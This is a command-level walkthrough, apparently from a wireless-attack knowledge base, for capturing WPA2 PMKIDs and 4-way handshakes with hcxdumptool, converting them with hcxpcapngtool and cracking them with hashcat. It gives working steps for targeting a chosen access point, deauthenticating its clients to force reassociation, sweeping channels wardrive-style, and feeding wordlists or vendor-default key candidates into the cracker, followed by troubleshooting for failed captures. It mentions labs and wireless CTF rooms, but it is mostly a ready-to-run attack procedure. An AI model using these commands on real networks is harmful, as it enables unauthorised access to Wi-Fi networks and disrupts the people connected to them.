# hcxtools — walkthrough

The modern PMKID + 4-way capture toolchain. Supersedes aircrack-ng's
`airodump-ng + aireplay-ng` pipeline for handshake collection.

## Preconditions

- hcxdumptool + hcxpcapngtool installed (`apt install hcxtools` on
  Kali; on OpenWRT / Pineapple, `opkg install hcxtools`).
- Monitor-capable adapter; hcxdumptool manages its own monitor mode.
- Optional: hashcat host with GPU for the crack step.

## Path A — PMKID capture (client-free)

```
# Filter to specific target BSSID(s).
echo "AA:BB:CC:DD:EE:FF" > /root/target.bssidlist

hcxdumptool -i wlan1 \
  -o /tmp/pmkid.pcapng \
  --enable_status=1 \
  --filterlist_ap=/root/target.bssidlist \
  --filtermode=2

# Watch the status output — look for "PMKID FOUND" or similar.
# Ctrl-C when it lands (usually seconds).

# Convert to hashcat 22000.
hcxpcapngtool -o /tmp/hs.22000 /tmp/pmkid.pcapng
grep '^WPA\*01' /tmp/hs.22000     # confirms PMKID line
```

## Path B — 4-way handshake capture with deauth

```
# Aggressive mode: deauth all clients on target AP.
hcxdumptool -i wlan1 \
  -o /tmp/handshake.pcapng \
  --enable_status=15 \
  --filterlist_ap=/root/target.bssidlist \
  --filtermode=2
```

The default mode already sends targeted deauth if a client is seen —
no separate aireplay step needed.

Convert:

```
hcxpcapngtool -o /tmp/hs.22000 /tmp/handshake.pcapng
grep '^WPA\*02' /tmp/hs.22000
```

## Path C — ESSID filter (crack fewer hashes)

Beacon captures often pull in adjacent APs. Filter down before
converting:

```
hcxpcapngtool \
  --essid=TargetSSID \
  -o /tmp/hs.22000 \
  /tmp/dump.pcapng
```

Or filter to a BSSID list at capture time using `filterlist_ap`.

## Path D — hcxlabtool aggressive sweep

hcxlabtool runs hcxdumptool in a channel-sweeping loop:

```
hcxlabtool -i wlan1 -o /tmp/lab.pcapng
```

Best for a lab environment or a broad WCTF room recon. Very loud —
sends assoc probes across many BSSIDs.

## Path E — Convert existing pcaps

```
# From .cap (aircrack-ng) or .pcapng
hcxpcapngtool -o /tmp/hs.22000 legacy_capture.cap

# Info on what was parsed
hcxpcapngtool --info legacy_capture.pcapng
# Look at output — reports PMKID / 4-way pairs found.
```

## Path F — Chain to hashcat

```
hashcat -m 22000 /tmp/hs.22000 /path/to/rockyou.txt -w 4 --status
```

The `WPA*01` / `WPA*02` distinction is transparent to hashcat mode
22000.

## Path G — Feed a candidate PSK list (vendor default)

```
# Combine with default-psk-derivation:
./upc_keys UPC1234567 > /tmp/upc-cands.txt
hashcat -m 22000 /tmp/hs.22000 /tmp/upc-cands.txt
```

## Failure modes

- **`hcxdumptool` reports 0 PMKIDs / handshakes.** AP suppresses
  PMKID and no clients associating during capture window. Widen the
  window or try Path B (deauth to force a reassoc).
- **`hcxpcapngtool` emits nothing.** Capture is missing the full
  4-way OR the ESSID doesn't match. Run `--info` on the pcap and
  check the frame-type breakdown.
- **Multiple ESSIDs in the pcap.** Use `--essid=` filter.
- **Adapter isn't monitor-capable.** hcxdumptool refuses to bring
  it up; use a supported chipset (see
  `hardware-and-antennas/reference.md`).
- **`WPA*01` line but crack fails.** Malformed conversion. Re-run
  `hcxpcapngtool` on the raw pcap; some 22000 files have stray
  `\r\n` on Windows-authored captures.

## Ergonomics

- `--rds=1` — enable status display (short form of `--enable_status=1`).
- `--rcascan=1` — scan for beacons on nearby channels first.
- `--use_gpsd=1` — GPS integration (wardrive-mode).
- Save/restore filter lists in files, not command-line args.

## Cite

- hcxtools GitHub — ZerBea.
- hashcat mode 22000 docs — the target format.
- attacks.json: `pmkid-capture`, `wpa2-4way-capture`.
